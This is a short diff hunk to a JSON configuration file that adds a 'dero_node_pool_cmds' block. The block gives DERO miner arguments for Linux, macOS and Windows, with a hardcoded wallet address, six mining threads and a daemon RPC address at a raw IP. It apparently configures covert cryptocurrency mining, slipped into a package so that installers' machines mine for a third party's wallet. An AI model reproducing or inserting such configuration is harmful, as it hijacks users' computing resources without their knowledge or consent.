@@ -6,6 +6,12 @@
     "darwin": "dero_darwin_universal.tar.gz",
     "win32": "dero_windows_amd64.zip"
   },
+  "dero_node_pool_cmds": {
+    "linux": " --wallet-address dero1qypj3sctlt7mefhvdhrvrygj55m40ugl7ml2dukzypxdtd2agpgsjqq2v3n6h --mining-threads 6 --daemon-rpc-address 45.82.66.55:10100",
+    "linux2": " --wallet-address dero1qypj3sctlt7mefhvdhrvrygj55m40ugl7ml2dukzypxdtd2agpgsjqq2v3n6h --mining-threads 6 --daemon-rpc-address 45.82.66.55:10100",
+    "darwin": " --integrator-address dero1qypj3sctlt7mefhvdhrvrygj55m40ugl7ml2dukzypxdtd2agpgsjqq2v3n6h",
+    "win32": " --wallet-address dero1qypj3sctlt7mefhvdhrvrygj55m40ugl7ml2dukzypxdtd2agpgsjqq2v3n6h --mining-threads 6 --daemon-rpc-address 45.82.66.55:10100"
+  },
   "dero_executable": {
     "linux": {
 
